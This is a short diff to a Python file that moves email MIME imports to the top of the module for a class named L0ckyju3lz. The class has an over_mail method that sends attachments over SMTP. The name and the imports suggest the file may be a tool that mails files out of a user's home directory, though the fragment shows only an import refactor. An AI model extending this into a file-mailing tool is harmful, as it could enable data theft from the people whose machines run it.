@@ -4,6 +4,9 @@ import sys
 import string
 import random
 import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
 import socket
 import re
 from os.path import expanduser
@@ -103,9 +106,6 @@ class L0ckyju3lz():
         else: return False
 
     def over_mail(self):
-        from email.mime.multipart import MIMEMultipart
-        from email.mime.text import MIMEText
-        from email.mime.application import MIMEApplication
         try:
             s = smtplib.SMTP(host=self.host, port=self.port, source_address=self.src_address)
             s.connect()
